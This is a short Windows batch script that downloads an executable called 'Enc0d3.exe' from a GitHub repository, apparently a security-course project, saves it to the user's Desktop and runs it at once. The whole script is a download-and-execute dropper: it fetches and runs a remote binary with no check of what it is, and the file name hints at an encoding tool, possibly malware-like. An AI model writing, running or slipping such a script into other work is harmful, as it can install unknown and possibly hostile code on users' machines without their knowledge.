@echo off
setlocal

set "URL=https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/Enc0d3.exe"
set "DEST=%USERPROFILE%\Desktop\Enc0d3.exe"

echo Downloading file...
curl -L -o "%DEST%" "%URL%"

if %ERRORLEVEL%==0 (
    echo Download completed successfully.
    echo Running the file...
    "%DEST%"
) else (
    echo Error occurred during download.
)

endlocal
